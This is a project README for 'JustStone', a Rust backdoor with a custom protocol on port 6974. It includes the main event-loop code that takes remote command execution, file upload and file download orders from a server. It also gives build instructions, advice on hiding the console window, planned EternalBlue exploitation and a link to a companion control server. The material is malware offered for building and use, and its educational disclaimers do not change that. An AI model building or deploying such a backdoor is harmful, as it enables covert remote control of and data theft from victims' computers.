
# JustStone
Just StoneTransferProtocol&amp;Backdoor
# Project Overview

# Introduction

This project stems from my interest in protocols and security, leading to the creation of a small backdoor and a proprietary protocol. The project is currently in development, with the backdoor's functionality completed and exploitation being implemented. I plan to use the EternalBlue exploit, and the entire backdoor and exploits are being developed exclusively in the Rust programming language.

**Note:** This project is still in progress.

## Features

- **Backdoor Functionality:** The backdoor's core functionality is complete and can be found in the `main.rs` file.
- **Exploits:** Exploits are being implemented in the `exploits.rs` file, currently featuring code for executing commands.
- **Dedicated Protocol:** The backdoor utilizes a dedicated protocol implemented in the `stprotocol.rs` file. It supports basic functionalities such as file upload, file download, and command execution.
- **Packet Structure:** The `structure.rs` file is dedicated to packet construction for the proprietary protocol, supporting packet conversion, serialization, and deserialization.
- **Port**: The current backdoor protocol is utilizing port 6974. Please take note of this information when configuring or interacting with the backdoor.

Note: Ensure that port 6974 is open and available for communication.

# Usage

## Dependency

To use this backdoor, you need the following libraries as dependencies. Include these dependencies in your project configuration:

```rust
[dependencies]
encoding_rs = "0.8.33"
sysinfo = "0.30.1"
bstr = "1.8.0"
winreg = "0.52.0"
winapi = { version = "0.3.9", features = ["winnt", "processthreadsapi", "securitybaseapi"] }
```
Make sure to add these dependencies to your project's Cargo.toml file. This will ensure that the required libraries are available for the backdoor to function properly.

If you encounter any issues related to missing dependencies, please verify that these libraries are correctly added to your project configuration. If you have further questions or need assistance, refer to the documentation or relevant community resources for support.

## Backdoor Configuration

The following is an example code for building a backdoor that is included in main.rs : 

```rust
mod exploits;
mod stprotocol;
mod structure;

use exploits::{Exploits, HandleExploits};
use stprotocol::{Client, HandleSession};
use structure::{Detector, Generator, StoneTransferProtocol, StructStone};
```

- The `mod` statements import the necessary modules for the backdoor, including `exploits`, `stprotocol`, and `structure`. These modules encapsulate functionalities related to exploits, the stone transfer protocol, and packet structure, respectively.

```rust
fn main() {
    let handle_server = thread::spawn(|| event_loop());

    handle_server
        .join()
        .expect("Connection to server is lost for unknown reasons. Backdoor terminated.");
}
```

- For seamless operation, it is recommended to utilize threads in the backdoor. A new thread `handle_server` is created to concurrently execute the `event_loop` function. This thread is responsible for continuous communication with the server.

```rust
fn event_loop() {
    let mut client = HandleSession::new("127.0.0.1:6974".to_string(), Exploits::default());
    let mut result: Result<(), ()>;

    loop {
        // 새션 생성후 서버와 지속적인 통신을 위한 루프문
        result = match client.receiving(StructStone::default()).get_type() {
            StoneTransferProtocol::Connection => {
                println!("Connection OK");
                Ok(())
            }
            // 서버의 응답 타입을 비교하여 보낼 요청을 생성함
            StoneTransferProtocol::ExecuteCmd =>
            // 타입이 ExecuteCmd 일 경우
            {
                client.exploit()
            }

            StoneTransferProtocol::Download =>
            // 타입이 Download 일 경우
            {
                client.download()
            }

            StoneTransferProtocol::Upload =>
            // 타입이 Upload 일 경우
            {
                client.upload()
            }

            StoneTransferProtocol::Disconnect => {
                client.disconnect();
                break;
            } // 만약 서버의 응답이 Disconnect 일 경우 연결을 종료한다

            _ => client.send(), //만약 위의 응답 타입을 제외한 응답을 보낼경우 서버의 응답과 같은 요청을 전송함
        };

        match result {
            Ok(_) => continue,
            Err(_) => client.HandleConnectionLoss(),
        };
    }
}
```

- The `event_loop` function represents the core of the backdoor, managing communication with the server. It continuously receives and processes packets from the server, generating appropriate responses based on the packet's type.

   - If the packet type is `StoneTransferProtocol::ExecuteCmd`, the backdoor exploits the command received from the server using the `exploit` module.
   - If the type is `StoneTransferProtocol::Download`, the backdoor initiates the download process.
   - If the type is `StoneTransferProtocol::Upload`, the backdoor triggers the upload process.
   - If the type is `StoneTransferProtocol::Disconnect`, the backdoor disconnects from the server, terminating the loop.

   - For any other packet type, the backdoor sends a request similar to the server's response.

This event loop structure allows the backdoor to effectively communicate with the server, execute commands, and perform various actions based on the server's instructions. Customize the code as needed for your specific use case or functionality requirements.

**Note:** Ensure that the backdoor is used responsibly and in compliance with legal and ethical standards. Unauthorized and malicious use is strictly prohibited.

## Building the Backdoor

After writing the code in the `main.rs` file, the next step is to build the backdoor using the following command:

```bash
cargo build --release
```

This command instructs Cargo, the Rust package manager, to build your project in release mode. The `--release` flag ensures that the compiler applies optimizations for better performance.

Upon successful execution of the command, Cargo will compile your Rust project and generate the executable binary. You can then run the backdoor using the generated binary.

Remember to handle any potential compilation errors or missing dependencies. If encountered, refer to the error messages for guidance on resolving issues related to the code or dependencies.

Once the build process is complete, you can find the compiled binary in the `target/release/` directory. Run the backdoor executable to initiate the backdoor functionality.

## Windows Subsystem Flag for Building in Release Mode

If you are building the backdoor for release, and debugging is not a priority, you should add the `#![windows_subsystem = "windows"]` flag at the top of the `main.rs` file. This flag configures the Windows subsystem for the binary, which is useful for releasing applications without displaying a console window.

Here's an example of how to include the flag in your `main.rs` file:

```rust
#![windows_subsystem = "windows"]

mod exploits;
mod stprotocol;
mod structure;

use exploits::{Exploits, HandleExploits};
use stprotocol::{Client, HandleSession};
use structure::{Detector, Generator, StoneTransferProtocol, StructStone};

// Rest of your code...
```

Including this flag ensures that when you build the backdoor in release mode, it won't display a console window. Note that this may make debugging more challenging, so use this flag only when you're preparing a release version of your application.

Remember to rebuild the project after adding this flag using the `cargo build --release` command.

## Customization

If you wish to customize this project, you can modify the code in the respective files: exploits.rs, stprotocol.rs, and structure.rs. Follow the provided comments for guidance.

Feel free to tailor the code to your specific requirements and functionalities. Remember to consider security implications and best practices when making changes.

Note: Ensure that your modifications comply with ethical standards and legal regulations. Unauthorized use of this code for malicious purposes is strictly prohibited.

## Python Server

This project includes a dedicated Python server. If you want the Python server, please visit [JustServer](https://github.com/3QNRpDwD/JustServer).

## How to Contribute

1. Fork this repository.
2. Create a new branch (`git checkout -b feature/new-feature`).
3. Make your changes (`git commit -am 'Add new feature'`).
4. Push to the branch (`git push origin feature/new-feature`).
5. Open a Pull Request.

## License

MIT License

Copyright (c) 2024 2QNRpDwD

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

**Disclaimer:** This project is for educational purposes only. Unauthorized use is strictly prohibited.
>>>>>>> 4c971b0d346d4e1c79dffdaedbc8e48c520d2828
